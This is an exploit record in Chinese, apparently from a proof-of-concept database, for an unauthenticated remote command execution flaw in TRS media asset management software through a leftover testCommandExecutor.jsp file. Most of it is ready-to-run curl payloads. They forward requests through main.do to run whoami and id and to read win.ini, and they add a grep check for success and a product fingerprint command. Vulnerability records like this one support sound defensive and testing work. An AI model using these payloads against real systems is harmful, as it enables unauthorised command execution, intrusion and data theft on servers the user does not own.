---
id: TRS-TEST-RCE
title: 拓尔思 TRS 媒资管理系统 testCommandExecutor.jsp 远程命令执行漏洞
product: trs
vendor: 拓尔思
version_affected: "TRS 媒资管理系统"
severity: CRITICAL
tags: [rce, 无需认证, 国产]
fingerprint: ["TRS", "拓尔思", "TRS媒资管理系统"]
---

## 漏洞描述

拓尔思 TRS 媒资管理系统遗留的 `testCommandExecutor.jsp` 测试文件存在远程命令执行漏洞。该文件直接接受 `cmdLine` 参数并在服务器上执行系统命令。

## 影响版本

- 拓尔思 TRS 媒资管理系统

## 前置条件

- 无需认证
- 测试文件 `testCommandExecutor.jsp` 未被删除

## 利用步骤

1. 通过 `main.do` 的 view 参数转发到 `testCommandExecutor.jsp`
2. 在 `cmdLine` 参数中指定要执行的命令

## Payload

### Windows 命令执行

```bash
curl -s "http://target/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=whoami&workDir=&pathEnv=&libPathEnv="
```

### Linux 命令执行

```bash
curl -s "http://target/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=id&workDir=&pathEnv=&libPathEnv="
```

### 读取敏感文件

```bash
curl -s "http://target/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=type+C:\\Windows\\win.ini&workDir=&pathEnv=&libPathEnv="
```

## 验证方法

```bash
curl -s "http://target/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=whoami&workDir=&pathEnv=&libPathEnv=" | grep -iv "error\|404"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "TRS\|拓尔思\|媒资管理"
```
